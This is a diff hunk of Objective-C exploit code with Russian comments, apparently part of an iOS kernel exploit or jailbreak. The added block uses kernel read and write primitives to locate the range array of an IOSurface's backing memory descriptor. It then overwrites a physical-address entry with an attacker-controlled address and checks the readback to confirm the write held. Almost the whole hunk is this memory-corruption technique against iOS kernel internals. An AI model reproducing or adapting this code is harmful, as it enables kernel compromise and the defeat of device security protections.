@@ -7256,6 +7256,41 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             if (!nPatched) kpNote(r, @"  [DSX] addr-записей с PA==backingPA нет (заполнение позже/другой объект)");
         }
     }
+    // 1.9.237: DSY — addr-записи [desc+0x60] все НУЛИ (type 0x10, но addr64=0 —
+    // это OFFSETS в бэкинг-стор, не VA). Базовый PA у РОДИТЕЛЯ: rangeObj =
+    // [IOSurface+0x178] = XPF-поле IOMemoryDescriptor_withAddressRanges_ref —
+    // root-MD бэкинга с ranges {addr64=PA, len}. Патч ranges[0].addr → ctlPA:
+    // prepare перестроит sub-MD с нашего PA, rewriter запишет его в desc+0x9c.
+    {
+        uint64_t ro237 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x178)) : 0;
+        uint64_t rovt = kpLooksLikeKernelPointer(ro237) ? kp_untag_ptr(early_kread64(ro237)) : 0;
+        uint64_t ks237 = kconstant(base) - 0xfffffff007004000ULL;
+        kpNote(r, [NSString stringWithFormat:@"  [DSY] rangeObj=%#llx vt(file)=%#llx (ждём 0x7b33db8)", (unsigned long long)ro237, (unsigned long long)(rovt ? rovt - ks237 : 0)]);
+        if (kpLooksLikeKernelPointer(ro237) && kpSafeToRead(ro237)) {
+            uint64_t arr237 = kp_untag_ptr(early_kread64(ro237 + 0x60));
+            uint32_t cnt237 = (uint32_t)early_kread64(ro237 + 0x68);
+            if (cnt237 > 0x400) cnt237 = 0x400;
+            kpNote(r, [NSString stringWithFormat:@"  [DSY] ranges=%#llx count=%u", (unsigned long long)arr237, cnt237]);
+            if (kpLooksLikeKernelPointer(arr237)) {
+                int nP237 = 0;
+                for (uint32_t i = 0; i < cnt237 && nP237 < 4; i++) {
+                    uint64_t addr = early_kread64(arr237 + (uint64_t)i * 16);
+                    uint64_t len = early_kread64(arr237 + (uint64_t)i * 16 + 8);
+                    kpNote(r, [NSString stringWithFormat:@"    dsy [%u]: addr=%#018llx len=%#llx%@", i, (unsigned long long)addr, (unsigned long long)len,
+                              addr == backingPA ? @" ← НАША" : @""]);
+                    if (addr == backingPA) {
+                        kpNote(r, [NSString stringWithFormat:@"    dsy ★ ranges[%u].addr → ctlPA %#llx", i, (unsigned long long)ctlPA]);
+                        usleep(2000);
+                        early_kwrite64(arr237 + (uint64_t)i * 16, ctlPA);
+                        uint64_t rb = early_kread64(arr237 + (uint64_t)i * 16);
+                        kpNote(r, [NSString stringWithFormat:@"      readback: %#018llx — %@", (unsigned long long)rb, rb == ctlPA ? @"ПРИЛИПЛО" : @"МИМО"]);
+                        nP237++;
+                    }
+                }
+                if (!nP237) kpNote(r, @"  [DSY] addr==backingPA в rangeObj нет — база глубже (арена/root MD)");
+            }
+        }
+    }
     // 1.9.224: spec+0x58 ПОСЛЕ execute#1 — пре-execute дамп (1.9.223) показал
     // канарейки и random (+0x00=0): спек ЗАПОЛНЯЕТСЯ фабрикой при первом execute,
     // а не при create/submit. Патчить надо ТУТ (pfn уже на месте) — retry возьмёт
